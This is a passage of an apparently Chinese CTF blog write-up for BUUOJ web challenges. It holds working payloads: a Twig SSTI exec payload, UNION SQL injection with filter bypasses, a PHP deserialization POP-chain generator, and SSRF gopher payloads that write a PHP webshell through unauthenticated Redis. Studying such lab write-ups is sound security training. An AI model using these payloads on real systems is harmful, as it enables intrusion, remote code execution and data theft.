class="token number">144000</span><span class="token operator">-</span><span class="token number">1762</span>cb225ca565<span class="token punctuation">;</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>qo3u19su6i7oha2lte6grem4t6<span class="token punctuation">;</span> time<span class="token operator">=</span><span class="token number">9999999999</span>Connection<span class="token punctuation">:</span> close<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Client<span class="token operator">-</span><span class="token constant">IP</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Referer<span class="token punctuation">:</span> gem<span class="token operator">-</span>love<span class="token operator">.</span>comFrom<span class="token punctuation">:</span> root@gem<span class="token operator">-</span>love<span class="token operator">.</span>comVia<span class="token punctuation">:</span> y1ng<span class="token operator">.</span>vip</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210195920865.png" class="" title="image-20201210195920865" loading="lazy"><hr><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h5 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h5><img src="/article/Buuoj-WEB-Write-up/image-20201213144912657.png" class="" title="image-20201213144912657" loading="lazy"><p>ID测试，不是SQL注入，测试<code>&#123;&#123;1+1&#125;&#125;</code></p><p>返回<code>2</code>，确认SSTI</p><img src="/article/Buuoj-WEB-Write-up/image-20201213145018456.png" class="" title="image-20201213145018456" loading="lazy"><p>根据流程，测试<code>&#123;&#123;2*'1'&#125;&#125;</code></p><p>输出<code>49</code></p><p>确认为Twig模板引擎</p><p>直接打Payload：</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /f*")&#125;&#125;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201213145633846.png" class="" title="image-20201213145633846" loading="lazy"><hr><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入</p><p>过滤<code> </code>,<code>+</code>,<code>or</code>,<code>and</code>等</p><p>空格用<code>/**/</code>替换</p><p>尝试爆列数，好家伙，22列</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>回显点在2,3</p><p>查一下数据库名</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173543614.png" class="" title="image-20201213173543614" loading="lazy"><p>库名web1</p><p>因为ban了<code>or</code>,所以<code>information_schema</code>,这时有<code>mysql.innodb_table_stats</code>，mysql默认是关闭InnoDB存储引擎 ，仅 Mysql&gt;5.6.x 可使用</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mariadb链接</a></p><p>查表</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173634852.png" class="" title="image-20201213173634852" loading="lazy"><p>表名<code> FLAG_TABLE</code>,<code>news</code>,<code>users</code>,<code>gtid_slave_pos</code>,<code>ads</code>,<code>users </code></p><h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>原型</p><pre class="language-none"><code class="language-none">1&#39;union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>2处是回显点，所以对2出注入，首先联合查询</p><p>然后分析<code>(select group_concat(a) from(select 1,2,3 as a union select * from users)x)</code></p><p>确认users列在web1中，慢慢试，无列名注入表的列数不相同会报错，最后发现users里有三列 </p><p>采用的子查询的方式，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。 </p><p><code>(select 1,2,3 as a union select * from users)</code></p><p>将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接<code>group_concat(a)</code>可得结果</p><img src="/article/Buuoj-WEB-Write-up/image-20201213175809048.png" class="" title="image-20201213175809048" loading="lazy"><hr><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>先上源码</p><pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>三个类</p><p><code>Modifier</code>，<code>Show</code>，<code>Test</code></p><p>逐个分析，首先路口题目给了从<code>Show</code>，可能不对，但还是先从<code>Show</code>看</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>三个魔术方法</p><pre class="language-php" data-language="php"><code class="language-php">__construct：当一个对象创建时调用__toString：当一个对象被当作一个字符串被调用__wakeup：反序列化时触发</code></pre><p>从<code>Show</code>入口，会调用<code>__wakeup</code>魔术方法，方法里将<code>$this-&gt;source</code>做字符串在<code>preg_match</code>函数里比较， 如果<code>$this-&gt;source</code>是Show类，这时会调用<code>__toString</code>方法。</p><p>再看<code>Modifier</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>一个魔术方法</p><pre class="language-none"><code class="language-none">__invoke：将对象调用为函数时触发</code></pre><p>很明显的文件包含<code>include</code>，这个类就是最终要读取<code>flag.php</code>的时候使用的了，我们要让<code>Modifier</code>被当做函数调用，这时就会调用<code>__invoke</code>方法，从而调用<code>append</code>函数，进行文件包含。</p><p>最后看<code>Test</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>两个魔术方法</p><pre class="language-none"><code class="language-none">__construct：当一个对象创建时调用__get：用于从不可访问的属性读取数据</code></pre><p>很关键的<code>__get</code>魔术方法，这里会返回<code>$this-&gt;p</code>即<code>$function()</code>作为函数调用，而我们恰好需要让<code>Modifier</code>被当做函数调用，只要在<code>Show</code>里实例化<code>Test</code>类，这样一来一条pop链就形成了。</p><h6 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h6><p>从<code>Show</code>入手，先反序列化函数触发<code>Show</code>类中<code>__wakeup</code>方法，方法内调用函数触发<code>__tosring</code>方法，<code>__tosring</code>中将<code>str</code>实例化为<code>Test</code>类，而<code>Test</code>类中没有<code>source</code>属性，所以会调用<code>__get</code>方法， 将<code>function</code>实例化为<code>Modifier</code>类，触发<code>Modifier</code>中的<code>__invoke</code>方法，最终调用<code>include</code>函数文件包含<code>flag.php</code></p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span><span class="token comment">//O:4:"Show":2:&#123;s:6:"source";O:4:"Show":2:&#123;s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:&#123;s:1:"p";O:8:"Modifier":1:&#123;s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";&#125;&#125;&#125;s:3:"str";N;&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span></code></pre><p>这里还有小注意点，题目中的php版本为 5.6.40 ，这个版本反序列化对于<code>protected</code>与<code>public</code>类别还是敏感的，可以看到这里是有<code>%00</code>存在的</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135255308.png" class="" title="image-20201218135255308" loading="lazy"><p>可见字符4个，前后都是<code>%00</code>，这时通过数据表传参可能会不准确，例如我本地调会显示如下</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135449017.png" class="" title="image-20201218135449017" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135521199.png" class="" title="image-20201218135521199" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135543020.png" class="" title="image-20201218135543020" loading="lazy"><p>所以我们最后进行<code>urlencode</code>，保证<code>%00</code>正常传入</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135722862.png" class="" title="image-20201218135722862" loading="lazy"><p>最后包含<code>flag.php</code>，拿到flag</p><hr><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>打开题目</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182110711.png" class="" title="image-20201223182110711" loading="lazy"><p>跟url有关，可能是ssrf，命令执行等，先输入<code>127.0.0.1&amp;whoami</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182233706.png" class="" title="image-20201223182233706" loading="lazy"><p>被ban，查看源码发现提示<code>?secret</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182323977.png" class="" title="image-20201223182323977" loading="lazy"><p>发现是linux命令<code>ifconfig</code>内容，考点应该是ssrf打内网</p><p>尝试用<code>file:/</code>读取文件发现被ban，使用 <code>file：/</code>、<code>file:&lt;空格&gt;///</code> 绕过</p><p>读到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//echo $url."\n";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//var_dump($match);</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了<code>file://</code>，<code>dict://</code>，<code>127.0.0.1</code>和<code>localhost</code>，应该是要找本机的服务，爆破下内网同网段下存活主机</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182749451.png" class="" title="image-20201223182749451" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223182807801.png" class="" title="image-20201223182807801" loading="lazy"><p>在<code>10.138.132.10</code>发现提示，爆破其端口，猜测为mysql，redis之类的服务</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184447546.png" class="" title="image-20201223184447546" loading="lazy"><p>在6379端口发现异常，至此明白为redis漏洞</p><p>尝试打redis未授权访问漏洞</p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p>在目标主机上生成<code>shell.php</code>，扫描<code>fla*</code>，以确定flag位置</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184856356.png" class="" title="image-20201223184856356" loading="lazy"><p>排除其他可能，确认flag在根目录，再打</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p><code>cat /flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223185801498.png" class="" title="image-20201223185801498" loading="lazy"><hr><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a><a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 